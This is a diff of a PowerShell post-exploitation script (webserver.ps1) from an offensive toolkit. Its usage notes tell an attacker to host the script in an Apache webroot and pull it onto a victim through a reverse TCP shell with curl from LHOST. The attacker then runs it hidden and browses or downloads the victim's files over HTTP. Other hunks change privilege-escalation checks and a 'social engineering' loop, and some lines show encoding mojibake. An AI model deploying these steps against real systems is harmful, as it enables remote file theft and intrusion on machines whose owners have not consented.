@@ -16,16 +16,16 @@
    to capture Screenshots of MouseClicks [<-SPsr>] and browser enumeration [<-SEnum>]
    The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell(s)
 
-   1º - Place this cmdlet in attacker apache2 webroot
+   1Âº - Place this cmdlet in attacker apache2 webroot
         cp webserver.ps1 /var/www/html/webserver.ps1
 
-   2º - Upload webserver using the reverse tcp shell prompt
+   2Âº - Upload webserver using the reverse tcp shell prompt
         cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1
 
-   3º - Remote execute webserver using the reverse tcp shell prompt
+   3Âº - Remote execute webserver using the reverse tcp shell prompt
         powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SEnum Verbose
 
-   4º - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
+   4Âº - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
 
 .NOTES
    If executed with administrator privileges then this cmdlet add's
@@ -439,11 +439,11 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
          Get-HotFixs
       }ElseIf($EOP -ieq "ACL"){## find Unquoted service paths
          ## and search recursive for folders with Everyone:(F) permissions
-         Get-Paths ACL
+         Get-Unquoted;Get-Paths
       }ElseIf($EOP -ieq "CVE"){## find missing CVE patchs
          Find-AllVulns
       }Else{## Default its to lunch only CVE tests
-         Get-HotFixs;Get-Rotten;Get-Paths ACL;Get-RegPaths;Get-DllHijack;Find-AllVulns
+         Use-AllModules
       }
    }
    
@@ -709,7 +709,7 @@ $Success = $False ## Python installation status
    #>
 
    ## Loop Function (Social Engineering)
-   # Hint: $i++ increases the nÂº of the $i counter
+   # Hint: $i++ increases the nÃ‚Âº of the $i counter
    Do {
        $check = cmd /c python --version
        ## check target host python version
@@ -881,18 +881,7 @@ If(-not($Installation) -or $Installation -ieq $null){
          write-host "ActiveTabName    : $ActiveTabName"
          write-host "WebServerTitle   : $WebTitle`n"
 
-      If($SEnum -ieq "Verbose"){
-         ## Display @webserver firewall rule
-         Get-NetFirewallRule|Where { $_.DisplayName -eq 'python.exe' }|Select-Object DisplayName,Description,Enabled,Profile,Direction,Action|Format-Table -AutoSize > $Env:TMP\PSfirewall.log
-         Get-Content -Path "$Env:TMP\PSfirewall.log";Remove-Item -Path "$Env:TMP\PSfirewall.log" -Force
-      }
-
-      ## TCP Connections enumeration
-      If($SEnum -ieq "Verbose"){
-         echo "Connection Status" > $Env:TMP\logfile.log
-      }Else{
-         echo "`nConnection Status" > $Env:TMP\logfile.log
-      }
+      echo "`nConnection Status" > $Env:TMP\logfile.log
       echo "-----------------" >> $Env:TMP\logfile.log
       echo "  Proto  Local Address          Foreign Address        State           PID" >> $Env:TMP\logfile.log
       cmd /c netstat -ano|findstr "${Remote_Host}:${Remote_Server_Port}"|findstr "LISTENING ESTABLISHED" >> $Env:TMP\logfile.log
